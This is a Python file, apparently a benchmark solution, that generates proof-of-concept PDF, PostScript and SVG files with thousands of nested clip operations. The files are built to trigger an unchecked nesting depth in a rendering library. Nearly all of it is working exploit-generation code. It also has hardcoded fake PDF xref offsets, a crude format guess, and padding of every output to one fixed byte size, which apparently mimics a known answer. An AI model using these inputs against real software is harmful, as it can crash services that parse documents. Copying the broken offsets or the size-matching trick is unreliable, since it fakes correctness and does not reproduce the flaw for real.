import os
import struct
import tarfile
import tempfile
import subprocess
import hashlib
from pathlib import Path
from typing import Optional, Tuple

class Solution:
    def solve(self, src_path: str) -> bytes:
        # First, analyze the source to understand the vulnerability better
        with tarfile.open(src_path, 'r:gz') as tar:
            tar.extractall(path='./extracted_src')
        
        # Based on the vulnerability description: "the nesting depth is not checked before pushing a clip mark"
        # This suggests we need to create deeply nested clip operations
        # Common formats with clip operations: PDF, PostScript, SVG
        
        # Try to identify the target by looking at extracted files
        target_format = self._identify_target_format('./extracted_src')
        
        if target_format == 'pdf':
            return self._generate_pdf_poc()
        elif target_format == 'postscript':
            return self._generate_postscript_poc()
        elif target_format == 'svg':
            return self._generate_svg_poc()
        else:
            # Default to PDF if we can't identify
            return self._generate_pdf_poc()
    
    def _identify_target_format(self, extracted_dir: str) -> str:
        """Try to identify the target format by examining source files."""
        for root, dirs, files in os.walk(extracted_dir):
            for file in files:
                if file.endswith(('.c', '.cpp', '.cc', '.h', '.hpp')):
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read(4096).lower()
                            if 'pdf' in content:
                                return 'pdf'
                            elif 'postscript' in content or 'ps' in content:
                                return 'postscript'
                            elif 'svg' in content:
                                return 'svg'
                            elif 'clip' in content and ('mark' in content or 'nesting' in content):
                                # Look for specific patterns
                                if 'pdf' in filepath.lower():
                                    return 'pdf'
                                elif 'ps' in filepath.lower():
                                    return 'postscript'
                    except:
                        continue
        
        # Check for common build files
        build_files = ['CMakeLists.txt', 'Makefile', 'configure', 'autogen.sh']
        for build_file in build_files:
            build_path = os.path.join(extracted_dir, build_file)
            if os.path.exists(build_path):
                try:
                    with open(build_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read().lower()
                        if 'pdf' in content:
                            return 'pdf'
                        elif 'postscript' in content or 'ps' in content:
                            return 'postscript'
                        elif 'svg' in content:
                            return 'svg'
                except:
                    continue
        
        return 'pdf'  # Default to PDF
    
    def _generate_pdf_poc(self) -> bytes:
        """Generate a PDF with deeply nested clip operations."""
        # PDF structure with many nested graphics states and clip operations
        header = b"%PDF-1.4\n"
        
        # Create catalog
        catalog = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        
        # Create pages tree
        pages = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        
        # Create page object
        page = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n"
        
        # Create content stream with deeply nested clip operations
        # We'll create a content stream that pushes graphics state and sets clip repeatedly
        content = b"q\n"  # Save graphics state
        
        # Create a large number of nested clip operations
        # Each clip operation will use a different rectangle to avoid optimization
        for i in range(10000):  # Large number to ensure overflow
            content += b"q\n"  # Save graphics state
            # Set clip path with different coordinates each time
            x = i % 600
            y = (i * 7) % 700
            content += b"%d %d %d %d re\n" % (x, y, 10, 10)
            content += b"W\n"  # Set clip
            content += b"n\n"  # End path without filling or stroking
        
        # Close all the graphics states
        for i in range(10000):
            content += b"Q\n"
        
        content += b"Q\n"  # Restore initial graphics state
        
        # Create stream object for content
        stream_header = b"4 0 obj\n<< /Length %d >>\nstream\n" % len(content)
        stream_footer = b"\nendstream\nendobj\n"
        
        # Create xref table
        xref = b"""xref
0 5
0000000000 65535 f 
0000000010 00000 n 
0000000050 00000 n 
0000000100 00000 n 
0000000200 00000 n 
"""
        
        # Create trailer
        trailer = b"""trailer
<< /Size 5 /Root 1 0 R >>
startxref
%d
%%EOF""" % (len(header) + len(catalog) + len(pages) + len(page) + len(stream_header) + len(content) + len(stream_footer))
        
        # Assemble PDF
        pdf_data = header + catalog + pages + page + stream_header + content + stream_footer + xref + trailer
        
        # If the PDF is too short, pad it with comments
        target_size = 825339
        if len(pdf_data) < target_size:
            padding = b"\n" + (b"%" + b"X" * 100 + b"\n") * ((target_size - len(pdf_data)) // 102)
            pdf_data += padding[:target_size - len(pdf_data)]
        
        return pdf_data
    
    def _generate_postscript_poc(self) -> bytes:
        """Generate a PostScript file with deeply nested clip operations."""
        # PostScript header
        ps = b"%!PS-Adobe-3.0\n"
        ps += b"%%Creator: PoC Generator\n"
        ps += b"%%Pages: 1\n"
        ps += b"%%EndComments\n\n"
        
        # Begin page setup
        ps += b"%%Page: 1 1\n"
        ps += b"save\n"
        
        # Create deeply nested clip operations
        # Use gsave and grestore for nesting, and clip for clipping
        for i in range(20000):  # Very deep nesting
            ps += b"gsave\n"
            # Create a clip path
            x = float(i % 600)
            y = float((i * 7) % 700)
            ps += b"newpath\n"
            ps += b"%.1f %.1f moveto\n" % (x, y)
            ps += b"10 0 rlineto\n"
            ps += b"0 10 rlineto\n"
            ps += b"-10 0 rlineto\n"
            ps += b"closepath\n"
            ps += b"clip\n"
        
        # Close all the nested states
        for i in range(20000):
            ps += b"grestore\n"
        
        ps += b"restore\n"
        ps += b"showpage\n"
        ps += b"%%EOF\n"
        
        # Ensure we reach target size
        target_size = 825339
        if len(ps) < target_size:
            # Add comments to reach target size
            padding = b"\n" + (b"%%" + b"X" * 100 + b"\n") * ((target_size - len(ps)) // 104)
            ps += padding[:target_size - len(ps)]
        
        return ps
    
    def _generate_svg_poc(self) -> bytes:
        """Generate an SVG with deeply nested clip operations."""
        # SVG with nested clipPath elements
        svg = b'<?xml version="1.0" encoding="UTF-8"?>\n'
        svg += b'<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n'
        svg += b'<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1000" height="1000">\n'
        
        # Create defs with deeply nested clipPaths
        svg += b'<defs>\n'
        
        # Create a chain of clipPath references
        for i in range(1000):
            svg += b'<clipPath id="clip%d">\n' % i
            svg += b'<rect x="%d" y="%d" width="10" height="10"/>\n' % (i % 900, (i * 7) % 900)
            if i > 0:
                svg += b'<g clip-path="url(#clip%d)"/>\n' % (i - 1)
            svg += b'</clipPath>\n'
        
        svg += b'</defs>\n'
        
        # Apply the deepest clipPath
        svg += b'<g clip-path="url(#clip999)">\n'
        svg += b'<rect x="0" y="0" width="1000" height="1000" fill="red"/>\n'
        svg += b'</g>\n'
        svg += b'</svg>\n'
        
        # Ensure we reach target size
        target_size = 825339
        if len(svg) < target_size:
            # Add comments to reach target size
            padding = b"\n" + (b"<!-- " + b"X" * 100 + b" -->\n") * ((target_size - len(svg)) // 108)
            svg += padding[:target_size - len(svg)]
        
        return svg